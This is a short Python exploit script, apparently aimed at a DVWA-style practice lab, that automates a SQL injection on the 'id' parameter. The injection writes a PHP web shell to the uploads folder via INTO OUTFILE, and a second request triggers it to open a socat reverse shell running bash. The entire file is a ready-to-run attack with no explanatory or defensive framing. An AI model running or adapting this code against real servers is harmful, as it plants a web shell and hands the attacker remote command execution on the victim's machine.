import requests
import time

# Function to send the SQL Injection payload
def send_sqli_payload():
    """Send the SQL injection payload to inject the reverse shell PHP code into the target server."""
    url = "http://192.168.67.166/vulnerabilities/sqli/"
    payload = {
        "id": "' UNION SELECT \"<?php exec('socat tcp-connect:192.168.67.166:4444 exec:bash'); ?>\", NULL INTO OUTFILE \"/var/www/html/hackable/uploads/reshell2.php\" #",
        "Submit": "Submit"
    }
    headers = {
        "Host": "192.168.67.166",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cookie": "PHPSESSID=5k2gri2ruu1dburaeg62h10b95; security=low",
        "Upgrade-Insecure-Requests": "1"
    }

    try:
        print(f"[+] Sending SQL Injection payload to {url}...")
        response = requests.get(url, headers=headers, params=payload)

        # Check if the response is successful (status code 200)
        if response.status_code == 200:
            print("[+] Payload sent successfully!")
        else:
            print(f"[-] Error sending SQL Injection: {response.status_code}")
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")

# Function to access the uploaded PHP reverse shell
def access_reverse_shell():
    """Access the uploaded PHP file to trigger the reverse shell."""
    shell_url = "http://192.168.67.166/hackable/uploads/reshell2.php"
    try:
        print(f"[+] Accessing the uploaded reverse shell PHP file at {shell_url}...")
        response = requests.get(shell_url)

        # Check if the response is successful (status code 200)
        if response.status_code == 200:
            print("[+] Reverse shell PHP file accessed successfully!")
        else:
            print(f"[-] Error accessing reverse shell file: {response.status_code}")
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")

# Main function to automate the entire process
def main():
    print("[+] Starting automation process...")

    # Step 1: Send SQL Injection payload to inject the reverse shell PHP file
    send_sqli_payload()

    # Wait for a moment to ensure the file has been created
    time.sleep(3)

    # Step 2: Access the uploaded PHP reverse shell file
    access_reverse_shell()

if __name__ == "__main__":
    main()
